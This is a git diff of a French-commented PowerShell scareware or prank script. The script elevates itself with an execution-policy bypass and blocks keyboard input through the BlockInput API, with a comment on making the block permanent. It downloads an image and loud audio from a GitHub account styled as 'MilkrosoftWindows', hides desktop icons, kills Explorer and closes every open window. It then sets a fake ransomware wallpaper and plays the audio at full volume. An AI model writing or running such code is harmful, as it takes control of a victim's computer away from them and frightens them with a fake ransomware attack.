@@ -1,6 +1,5 @@
-  
-  # desactiver inputs
-  <#
+
+# desactiver le clavier pendant x secondes
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 
 $code = @"
@@ -13,24 +12,7 @@ $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInp
 function Disable-UserInput($seconds) {
     $userInput::BlockInput($true)
     Start-Sleep $seconds
-    $userInput::BlockInput($false)
-}
-
-Disable-UserInput -seconds 30 | Out-Null
-#>
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
-
-$code = @"
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-"@
-
-$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
-
-function Disable-UserInput($seconds) {
-    $userInput::BlockInput($true)
-    Start-Sleep $seconds
-    $userInput::BlockInput($false)
+    $userInput::BlockInput($false) # enlever cette ligne pour desactiver clavier indefiniement
 }
 
 # fonction pour changer le fond d'ecran
@@ -53,18 +35,24 @@ Function Set-WallPaper($Image) {
       $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
   }
   
+  #
+  #
   #cense cacher la taskbar mais ca marche pas
   Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search -Name SearchBoxTaskbarMode -Value 0 -Type DWord -Force
   Stop-Process -ProcessName explorer -Force
-
-  $WebClient = New-Object System.Net.WebClient
+  #
+  #
+  #
   
+  # Telecharger des trucs
+  $WebClient = New-Object System.Net.WebClient
   $WebClient.DownloadFile("https://raw.githubusercontent.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/main/cheh.jpg","C:\system32.jpg ")
   $WebClient.DownloadFile("https://github.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/raw/main/monster-inc-mike-wazowski-theme-song-earrape-best-version.mp3", "C:\zic.mp3")
 
+  # Cacher icones desktop
   $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
-  Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 # cacher icones desktop
-  Get-Process "explorer" | Stop-Process
+  Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 #cache icones
+  Get-Process "explorer" | Stop-Process # reboot explorer
   
   # Changer fond d'ecran vers image ransomware
   Set-WallPaper -Image "C:\system32.jpg"
@@ -72,6 +60,8 @@ Function Set-WallPaper($Image) {
   #fermer fenetres ouvertes
   Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
   
+  
+  # Fonction set volume
   Add-Type -AssemblyName System.Windows.Forms
 
 Function Set-SoundVolume 
@@ -98,7 +88,8 @@ Function Set-SoundVolume
         $obj.SendKeys( [char] 175 )
     }
 }
-# Example usage
+
+
 Set-SoundVolume 100
 
 # Jouer Musique
